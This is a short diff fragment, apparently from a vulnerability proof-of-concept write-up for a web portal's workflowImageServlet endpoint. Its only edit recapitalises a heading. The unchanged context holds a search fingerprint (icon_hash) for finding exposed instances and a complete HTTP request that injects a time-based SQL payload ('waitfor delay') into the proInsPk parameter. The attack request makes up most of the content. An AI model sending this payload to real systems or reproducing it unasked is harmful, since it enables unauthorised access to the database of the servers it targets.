@@ -5,7 +5,7 @@
 icon_hash="1085941792"  
 ```
 
-## poc
+## POC
 ```
 GET /portal/pt/servlet/workflowImageServlet/doPost?pageId=login&wfpk=1&proInsPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
 Host: 192.168.63.129:8088
